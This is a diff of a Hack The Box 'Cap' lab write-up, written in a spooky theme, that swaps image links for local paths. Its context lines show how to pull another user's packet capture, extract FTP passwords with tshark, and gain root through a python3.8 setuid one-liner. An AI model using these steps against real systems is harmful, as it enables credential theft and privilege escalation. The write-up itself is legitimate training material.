@@ -21,13 +21,13 @@ curl http://10.10.10.245/data/0 -o haunted.pcap
 PCAP Ghost Whispering
 → Heard credentials whispering in the packets: Often times when a there is an ID/# we can run other ID's to see what we can find.
 
-![NMAP](https://raw.githubusercontent.com/Lantern76/HTB_Writeups/main/Cap/1.png?raw=true)
+![NMAP Scan Results](/assets/Cap/1.png)
 
 Step 2
 tshark -r haunted.pcap -Y "ftp contains 'PASS'" -Tfields -e ftp.request.arg
 → "The spirits say: User/Password 🎃
 
-![2](https://github.com/user-attachments/assets/d365dc96-c522-4917-b683-3e7f9820a72c)
+![NMAP Scan Results](/assets/Cap/1.png)
 
 
 SSH Apparition
@@ -49,7 +49,7 @@ getcap -r / 2>/dev/null
 Poltergeist Privileges
 → Exorcised root privileges:
 
-![5](https://github.com/user-attachments/assets/6bb5a5d4-fb76-4cf7-ab8b-2bb7e46857fd)
+![NMAP Scan Results](/assets/Cap/1.png)
 
 Step 2
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
